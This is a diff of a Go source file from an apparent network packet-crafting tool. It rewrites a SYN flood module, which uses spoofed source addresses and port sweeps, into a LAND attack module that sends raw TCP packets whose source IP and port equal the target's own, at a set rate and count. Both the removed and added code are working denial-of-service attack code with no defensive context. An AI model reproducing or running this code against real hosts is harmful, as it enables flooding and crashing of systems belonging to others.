@@ -3,7 +3,7 @@ package module
 import (
 	"os"
 	_ "log"
-	"strings"
+	_"strings"
 	"errors"
 	_"syscall"
 	"math/rand"
@@ -12,64 +12,27 @@ import (
 	flags "github.com/jessevdk/go-flags"
 )
 
-type SynFloodOpt struct {
+type LandOpt struct {
 	BaseOption
-	Spoof string `short:"s" long:"spoof" description:"use spoof address" value-name:"address[/mask]" default:""`
 	DestFunc func(string) `short:"d" long:"destination" description:"destination address" value-name:"address"`
 	PortFunc func(string) `short:"p" long:"dport" description:"destination port" value-name:"port[:port]"`
-	ports []uint16
+	port uint16
 	CountFunc func(int) `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
 	RateFunc func(string) `short:"r" long:"rate" description:"send packets as a specific rate, such as 100/ms, 2/s, 100/min, the default is \"nolimit\"" value-name:"<speed>" default:"nolimit"`
-	TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
 }
 
-func (s SynFloodOpt) IsBroadcast() bool {
+func (s LandOpt) IsBroadcast() bool {
 	return false
 }
 
-func synFloodEntry(stopChan chan int, remainFlags []string) error {
-	var opts SynFloodOpt
+func landEntry(stopChan chan int, remainFlags []string) error {
+	var opts LandOpt
 
-	opts.ports = []uint16{}
 	var err2 error
 	opts.PortFunc = func(portStr string) {
-		var st, en uint16
-		sepCount := strings.Count(portStr, ":")
-		if sepCount == 1 {
-			ports := strings.Split(portStr, ":")
-			var err error
-			st, err = parsePort(ports[0])
-			if err != nil { err2 = nil }
-			en, err = parsePort(ports[1])
-			if err != nil { err2 = nil }
-			if st > en {
-				err2 = errors.New("start port number must be smaller than end port number")
-				return
-			}
-		} else if sepCount == 0 {
-			var err error
-			st, err = parsePort(portStr)
-			if err != nil {
-				err2 = err
-				return
-			}
-			en = st
-		} else {
-			err2 = errors.New("wrong port format")
-			return
-		}
-		for i := st; i <= en; i++ {
-			opts.ports = append(opts.ports, i)
-		}
-		// sort unique
-		m := make(map[uint16] int)
-		for _, i := range opts.ports {
-			m[i] = 1
-		}
-		opts.ports = opts.ports[:0]
-		for i, _ := range m {
-			opts.ports = append(opts.ports, i)
-		}
+		var e error
+		opts.port, e = parsePort(portStr)
+		if e != nil { err2 = e }
 	}
 
 	opts.RateFunc = func(rate string) {
@@ -105,30 +68,23 @@ func synFloodEntry(stopChan chan int, remainFlags []string) error {
 
 	if err2 != nil { return err2 }
 
-	if len(opts.ports) == 0 {
-		opts.ports = make([]uint16, 65535, 65535)
-		for i := 1; i < 65536; i++ {
-			opts.ports[i - 1] = uint16(i)
-		}
-	}
 	if opts.dest == nil {
 		return errors.New("no destination IP specified")
 	}
 
-	return packetSend(stopChan, synFloodBuild, &opts)
+	return packetSend(stopChan, landBuild, &opts)
 }
 
-func synFloodBuild(opts_ CommonOption) []protocol.Layer {
-	opts := opts_.(*SynFloodOpt)
-	srcip := chooseIPv4(opts.Spoof)
+func landBuild(opts_ CommonOption) []protocol.Layer {
+	opts := opts_.(*LandOpt)
 
 	pseudoHeader := make([]byte, 12, 12)
-	copy(pseudoHeader[0:4], srcip.To4())
+	copy(pseudoHeader[0:4], opts.dest.To4())
 	copy(pseudoHeader[4:8], opts.dest.To4())
 	tcp := &protocol.TCP {
 		PseudoHeader: pseudoHeader,
-		SrcPort: uint16(rand.Intn(0xffff)),
-		DstPort: opts.ports[curPort],
+		SrcPort: opts.port,
+		DstPort: opts.port,
 		Seq: uint32(rand.Intn(0x100000000)),
 		Ack: 0,
 		Flags: protocol.TCPFlags {
@@ -136,10 +92,6 @@ func synFloodBuild(opts_ CommonOption) []protocol.Layer {
 		},
 		Rwnd: 20 * 1460,
 		UrgPtr: 0,
-	}
-	curPort++
-	if curPort >= len(opts.ports) {
-		curPort -= len(opts.ports)
 	}
 
 	ip4 := &protocol.IPv4Packet {
@@ -151,10 +103,11 @@ func synFloodBuild(opts_ CommonOption) []protocol.Layer {
 		DF: true,
 		MF: false,
 		FragmentOffset: 0,
-		TTL: uint8(opts.TTL),
+		TTL: uint8(64),
 		Protocol: protocol.IPP_TCP,
-		SrcIP: srcip,
+		SrcIP: opts.dest,
 		DstIP: opts.dest,
 	}
 	return []protocol.Layer{ip4, tcp}
 }
+
